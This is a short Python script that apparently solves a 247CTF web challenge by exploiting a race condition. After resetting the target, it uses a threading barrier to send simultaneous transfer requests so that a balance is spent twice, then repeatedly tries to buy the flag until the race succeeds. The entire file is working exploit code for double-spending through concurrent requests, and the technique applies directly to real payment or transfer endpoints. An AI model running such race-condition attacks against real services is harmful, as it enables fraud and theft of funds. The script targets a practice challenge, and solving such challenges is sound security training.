import threading
import requests
import time

url = "https://74bf5779916301b7.247ctf.com/"

THREADS = 2

def transfer(barrier):
    barrier.wait()
    requests.get(f'{url}?from=1&to=2&amount=247')

while True:
    requests.get(f"{url}/reset")

    barrier = threading.Barrier(THREADS)
    threads = []

    print("> Launching race")
    for _ in range(THREADS):
        t = threading.Thread(target=transfer, args=(barrier,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("> Trying to buy flag")
    res = requests.get(f"{url}/?flag=1&from=2")

    if "insufficient" not in res.text.lower():
        print("Flag:", res.text)
        break

    print("> Race failed")
    time.sleep(0.5)